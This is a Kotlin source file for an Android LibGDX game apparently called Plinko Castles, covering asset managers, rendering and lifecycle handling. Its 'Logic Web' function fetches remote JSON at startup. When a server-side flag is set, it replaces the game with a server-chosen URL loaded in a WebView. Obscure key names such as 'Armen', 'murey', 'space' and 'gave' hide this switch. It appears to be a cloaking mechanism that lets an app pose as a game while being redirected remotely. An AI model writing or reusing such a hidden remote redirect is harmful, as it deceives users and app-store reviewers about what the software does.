package com.plinko.castles.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.plinko.castles.MainActivity
import com.plinko.castles.appContext
import com.plinko.castles.game.manager.MusicManager
import com.plinko.castles.game.manager.NavigationManager
import com.plinko.castles.game.manager.ParticleEffectManager
import com.plinko.castles.game.manager.SoundManager
import com.plinko.castles.game.manager.SpriteManager
import com.plinko.castles.game.manager.util.MusicUtil
import com.plinko.castles.game.manager.util.ParticleEffectUtil
import com.plinko.castles.game.manager.util.SoundUtil
import com.plinko.castles.game.manager.util.SpriteUtil
import com.plinko.castles.game.screens.CatapultaLoaderScreen
import com.plinko.castles.game.utils.advanced.AdvancedGame
import com.plinko.castles.game.utils.disposeAll
import com.plinko.castles.util.Gist
import com.plinko.castles.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false

var GDX_ORIGINAL_LINK = ""
    private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set
    lateinit var particleEffectManager: ParticleEffectManager private set


    val musicUtil    by lazy { MusicUtil()    }
    val soundUtil    by lazy { SoundUtil()    }
    val allAssets    by lazy { SpriteUtil.AllAssets() }
    val startAssets  by lazy { SpriteUtil.StartAssets() }
    val particleEffectUtil by lazy { ParticleEffectUtil() }


    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)
    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Castle", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)
        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)
        particleEffectManager = ParticleEffectManager(assetManager)

        navigationManager.navigate(CatapultaLoaderScreen::class.java.name)

        starCastleLogic()
    }

    private val colorBackground = Color.valueOf("241651")

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(colorBackground)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(musicUtil, assetManager)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        super.pause()
        if (GDX_GLOBAL_isPauseGame) musicUtil.music?.pause()
    }

    override fun resume() {
        super.resume()
        if (GDX_GLOBAL_isPauseGame.not()) musicUtil.music?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun starCastleLogic() {
        log("starCastleLogic")
        activity.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.initWeb(activity.binding.webView)

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("Armen", "murey") ?: "murey"

        try {
            if (path == "murey") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (getJSON != null) {
                        if (getJSON.space == "true") {
                            GDX_ORIGINAL_LINK = getJSON.gave
                            activity.loadUrl(GDX_ORIGINAL_LINK)

                            //GDX_ORIGINAL_LINK = "https://www.google.test"
                            //activity.loadUrl("https://www.google.com/")
                        } else {
                            GDX_GLOBAL_isGame = true
                        }

                        //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("True", link).apply() }
                        //activity.loadUrl(link)

                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

}